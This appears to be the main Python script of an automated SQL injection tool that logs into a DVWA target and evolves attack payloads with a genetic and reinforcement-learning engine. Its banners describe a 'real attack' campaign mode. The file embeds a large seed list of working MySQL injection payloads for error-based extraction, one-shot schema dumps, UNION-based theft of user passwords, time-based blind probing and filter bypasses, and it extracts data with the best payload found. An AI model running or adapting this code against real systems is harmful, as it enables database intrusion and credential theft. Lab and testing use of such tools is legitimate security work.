import sys
import os
import random
import time

# Ensure imports work from current directory
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from utils.http_client import HTTPClient
from utils.experience_manager import ExperienceManager
from core.island_manager import IslandManager
from core.context_discoverer import ContextDiscoverer
from utils.data_extractor import DataExtractor

def run_prometheus():
    training_mode = os.getenv("TRAINING_MODE", "false").lower() == "true"
    
    print("\n" + "="*50, flush=True)
    if training_mode:
        print("--- [ مختبر التدريب النمطي: وضع المحاكاة النشط ] ---", flush=True)
        print("--- [ الوضع: تعليمي / تحليل الأخطاء المفصل ] ---", flush=True)
    else:
        print("--- [ القيادة والسيطرة: وحدة الهجوم الفعلي ] ---", flush=True)
        print("--- [ الوضع: حملة اختراق متطورة / هجوم صامت ] ---", flush=True)
    print("="*50, flush=True)
    
    client = HTTPClient(base_url=os.getenv("TARGET_URL", "http://localhost/"))
    exp_manager = ExperienceManager()
    extractor = DataExtractor()
    
    print("[*] Stage: Configuration Loading...", flush=True)
    target_user = os.getenv("TARGET_USER", "admin")
    target_pass = os.getenv("TARGET_PASS", "password")
    target_name = os.getenv("TARGET_NAME", "default")
    target_security = os.getenv("TARGET_SECURITY", "medium")
    
    def safe_int(val, default):
        try:
            if val is None or str(val).strip() == "" or str(val).lower() == "undefined":
                return default
            return int(val)
        except:
            return default

    pop_size = safe_int(os.getenv("POPULATION_SIZE"), 12)
    max_gens = safe_int(os.getenv("MAX_GENERATIONS"), 30)
    
    def safe_float(val, default):
        try:
            if val is None or str(val).strip() == "" or str(val).lower() == "undefined":
                return default
            return float(val)
        except:
            return default

    lr = safe_float(os.getenv("RL_LEARNING_RATE"), 0.1)
    exploration = safe_float(os.getenv("RL_EXPLORATION_RATE"), 0.5)
    curiosity = safe_float(os.getenv("RL_CURIOSITY_WEIGHT"), 1.0)
    
    print(f"[*] Config: Target={target_name}, Security={target_security}, Pop={pop_size}, MaxGens={max_gens}, LR={lr}, Epsilon={exploration}, Curiosity={curiosity}", flush=True)
    
    # Phase 0: Ensure Target Profile
    print("[*] Stage: Database Initialization...", flush=True)
    exp_manager.save_target_profile(client.base_url, target_name=target_name)

    # المرحلة 1 و 2: تسجيل الدخول وضبط الحماية
    print("[*] Stage: Target Authentication...", flush=True)
    if not client.setup_dvwa(username=target_user, password=target_pass, security_level=target_security):
        print("[!] Failed to establish session.", flush=True)
        return

    # المرحلة 3: اكتشاف السياق (Context Discovery)
    print("[*] Stage: Smart Context Discovery...", flush=True)
    discoverer = ContextDiscoverer(client, disable_strings=(target_security == "high"))
    discovery_results = discoverer.discover()
    
    inj_type = discovery_results["context"]
    db_type = discovery_results["db_type"]
    comment_style = discovery_results.get("comment_style", "-- -")
    disable_quotes = discovery_results.get("disable_strings", False)
    
    print(f"[*] Discovery Results: Context={inj_type}, DB={db_type}, Style={comment_style}", flush=True)
    
    print(f"[*] Targeting Target '{target_name}' @ {client.base_url}", flush=True)
    
    # Load payloads from database API
    print("[*] Stage: Loading Base Payloads...", flush=True)
    base_payloads = client.fetch_base_payloads()
    
    # Fallback/Default payloads if DB is empty or inaccessible
    if not base_payloads:
        print("[!] DB Payloads empty, using internal seeds.", flush=True)
        base_payloads = [
            # --- STRUCTURE & DISCOVERY SEEDS (30+) ---
            *[f"1 ORDER BY {i}" for i in range(1, 21)],
            *[f"1 GROUP BY {i}" for i in range(1, 11)],
            "1 PROCEDURE ANALYSE(1,1)",
            "1 INTO @", "1 INTO @,@", "1 LIMIT 1 INTO @,@",
            "1 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,DATABASE())),1)",

            # --- ADVANCED ERROR-BASED EXFILTRATION (25+) ---
            "1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)",
            "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)",
            "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))",
            "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "1 AND EXP(~(SELECT * FROM (SELECT USER())a))",
            "1 AND JSON_KEYS((SELECT * FROM (SELECT [DATABASE()])a))",
            "1 AND ST_LatFromGeoHash(CONCAT(0x7e,(SELECT VERSION()),0x7e))",
            "1 AND ST_LongFromGeoHash(CONCAT(0x7e,(SELECT USER()),0x7e))",
            "1 AND (SELECT 1 FROM (SELECT @:=0, (SELECT COUNT(*) FROM information_schema.columns WHERE @:=@+1) AS row_count) AS t)",
            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT version()),0x23,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
            "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT schema_name FROM information_schema.schemata LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",

            # --- DIOS (DUMP IN ONE SHOT) & MASS EXTRACTION (20+) ---
            "1 UNION SELECT 1,(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",
            "1 UNION SELECT 1,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
            "1 UNION SELECT NULL,(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
            "1 UNION SELECT 1,group_concat(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_schema=database()",
            "1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users",
            "1 UNION SELECT 1,@@version_compile_os,@@version_compile_machine",
            "1 UNION SELECT 1,table_name,NULL FROM information_schema.tables WHERE table_schema=database()",
            "1 UNION SELECT 1,column_name,NULL FROM information_schema.columns WHERE table_name=0x7573657273",

            # --- ADVANCED BLIND & TIME-BASED PROBING (20+) ---
            "1 AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)",
            "1 AND (SELECT 1 FROM (SELECT(BENCHMARK(10000000,MD5(1))))a)",
            "1 OR (SELECT 1 FROM(SELECT(SLEEP(5)))a)",
            "1 XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR 1",
            "1 AND (SELECT 1 FROM users WHERE user=0x61646d696e AND password REGEXP '^a')",
            "1 AND (SELECT 1 FROM users WHERE user=0x61646d696e AND password LIKE 0x6125)",
            "1 AND (SELECT ASCII(SUBSTR(password,1,1)) FROM users LIMIT 0,1)>64",
            "1 AND (SELECT BIT_AND(1,1))",
            "1 AND (SELECT 1 FROM(SELECT(SLEEP(5)))a) AND 1=1",
            "1 AND (SELECT 1 FROM(SELECT(SLEEP(5)))a) OR 1=2",

            # --- COMPLEX BYPASS & LOGICAL VARIANTS (15+) ---
            "1.e(OR)1", "1.e(AND)1", "1||(TRUE)", "1&&(TRUE)", "1 XOR TRUE",
            "1 || 1 regexp 1", "1 || 1 rlike 1", "1 || 1 between 1 and 1",
            "1 || 1 in (1)", "1 || 1 is not null", "1 || !0", "1 || ~0",
            "1 || hex(1)=31", "1 || concat(1)=1", "1 || length(1)=1",
            "%bf%27 OR 1=1", "%df%27 OR 1=1", "%8c%a8%27 OR 1=1", # Wide-byte
            "1 /*!50000UNION*//*!50000SELECT*/ 1,2",
            "1 UNION/**/SELECT/**/1,2",
            "1 UN/**/ION SEL/**/ECT 1,2"
        ]
    
    # Add quote-based seeds if level is low
    if target_security == "low":
        base_payloads.extend([
            "admin'--", "' OR '1'='1", "1' UNION SELECT 1,2#",
            "1' AND 1=1#", "1' AND SLEEP(5)#"
        ])

    # المرحلة ٤: التقاط "الخط الأساسي" (Baseline)
    # نستخدم رقم "1" كمرجع لأنه يعيد بيانات الأدمن بشكل شرعي، وذلك لمنع النتائج الكاذبة.
    print("[*] Stage: Capturing Baseline (Testing '1')...", flush=True)
    baseline_response = client.send_request("1")

    print("[*] Stage: Evolutionary Engine Initialization...", flush=True)
    island = IslandManager(
        client, 
        base_payloads, 
        exp_manager, 
        population_size=pop_size, 
        context=inj_type, 
        disable_strings=disable_quotes,
        baseline=baseline_response,
        target_name=target_name,
        comment_style=comment_style,
        learning_rate=lr,
        exploration_rate=exploration,
        curiosity_weight=curiosity
    )
    
    start_gen = island.current_gen
    max_generations = start_gen + max_gens
    
    print(f"[*] Resuming from generation {start_gen}, target end generation: {max_generations}", flush=True)
    
    # Load historical successes to avoid duplication and track progress
    print("[*] Stage: Loading Historical Successes...", flush=True)
    historical_exploits = exp_manager.get_all_exploits()
    successful_payloads = {e[0] for e in historical_exploits} if historical_exploits else set()
    print(f"[*] Loaded {len(successful_payloads)} historical successes.", flush=True)

    if start_gen >= max_generations:
        print(f"[!] Target generation already reached ({start_gen} >= {max_generations}). Use a larger MAX_GENERATIONS to continue.", flush=True)
        return

    for gen in range(start_gen, max_generations):
        print(f"\n[+] Processing generation {gen + 1} of {max_generations}...", flush=True)
        try:
            island.evolve_generation(gen)
            # Extra keep-alive push to stdout
            print(f"[*] Generation {gen + 1} complete. Current Hall of Fame size: {len(island.hall_of_fame)}", flush=True)
        except Exception as e:
            print(f"  [!] CRITICAL ERROR in Generation {gen + 1}: {e}", flush=True)
            import traceback
            traceback.print_exc()
            continue
        
        # Awareness: Check if we have new successes
        current_successes = set(island.hall_of_fame)
        new_successes = current_successes - successful_payloads
        
        if new_successes:
            for payload in new_successes:
                print(f"\n[!!!] NEW EXPLOIT DISCOVERED: {payload}", flush=True)
                successful_payloads.add(payload)
        
        # We don't stop early anymore.
    
    if successful_payloads:
        print("\n" + "*"*60, flush=True)
        print(f"[!!!] ATTACK PHASE COMPLETE: {len(successful_payloads)} SUCCESSFUL EXPLOITS FOUND", flush=True)
        for i, p in enumerate(successful_payloads):
            print(f"  {i+1}. {p}", flush=True)
        print("*"*60, flush=True)
        
        # Use the best one for extraction
        best_payload = list(successful_payloads)[0]
        print(f"\n[*] Initializing Data Extraction with optimal payload...", flush=True)
        final_response = client.send_request(best_payload)
        extracted_data = extractor.extract(final_response['text'])
        print(extractor.format_report(extracted_data), flush=True)
    else:
        print("\n[!] Max generations reached. No full exploit found.", flush=True)

if __name__ == "__main__":
    try:
        run_prometheus()
    except KeyboardInterrupt:
        print("\n[!] وحدة الهجوم halted by user.", flush=True)
        sys.exit(0)
    except Exception as e:
        print(f"\n[CRITICAL_SYSTEM_ERROR] {str(e)}", flush=True)
        import traceback
        traceback.print_exc()
        sys.exit(1)
